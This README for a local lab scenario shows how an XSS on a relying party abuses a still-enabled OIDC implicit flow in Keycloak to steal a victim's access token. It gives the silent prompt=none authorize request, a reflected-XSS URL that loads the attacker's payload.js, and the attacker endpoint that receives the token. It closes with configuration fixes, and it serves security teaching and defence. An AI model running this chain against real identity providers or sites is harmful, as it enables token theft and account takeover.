# Scenario 1 — Implicit flow still enabled on a code-flow client

Based on <https://security.lauritz-holtmann.de/post/xss-ato-gadgets/> (gadget 1).

## Idea

The RP itself is fine: it logs users in with the **authorization code flow +
PKCE**. The bug is one checkbox in the IdP: the client also still allows the
deprecated **implicit flow** (`response_type=token`).

An XSS in the RP origin can therefore run:

```
open  https://IdP/auth?client_id=s1-implicit
                       &response_type=token         <-- implicit
                       &response_mode=fragment
                       &redirect_uri=<RP origin>
                       &prompt=none                 <-- silent, no UI
```

With an active Keycloak session the IdP redirects straight back to
`http://127.0.0.1:8101/callback#access_token=…`. That page is same-origin
with the injected script, so it just reads `location.hash` and exfiltrates the
victim's `access_token`.

## Layout

| file | port | role |
|------|------|------|
| `main.go`         | 8101 | victim RP: real code+PKCE login, plus a reflected-XSS `/search` |
| `attacker/main.go`| 9101 | hosts the payload, receives the token, calls `userinfo` to prove ATO |

## Run

```sh
# from OIDC/  – Keycloak must be up with the xss-ato realm (see ../README.md)
cd s1-implicit-flow
go run .            # RP        -> http://127.0.0.1:8101
go run ./attacker   # attacker  -> http://127.0.0.1:9101
```

1. Open <http://127.0.0.1:8101/login>, sign in as `victim` / `victim`
   (this is the "active IdP session" precondition). If login fails with
   "Invalid username or password", run `bash ../keycloak/setup.sh`.
2. Open <`http://127.0.0.1:8101/search?q=%3Cscript%20src=%22http://127.0.0.1:9101/payload.js%22%3E%3C/script%3E>
3. The attacker console prints the stolen `access_token` and the `userinfo`
   response — `preferred_username: victim`. Also visible at
   <http://127.0.0.1:9101/loot>.

## Fix

* Disable every unused `response_type` on the client — here, turn the implicit
  flow **off** (`implicitFlowEnabled: false`).
* Don't reflect user input without output encoding; add a strict CSP.
* Reconsider whether the client needs `prompt=none` at all.
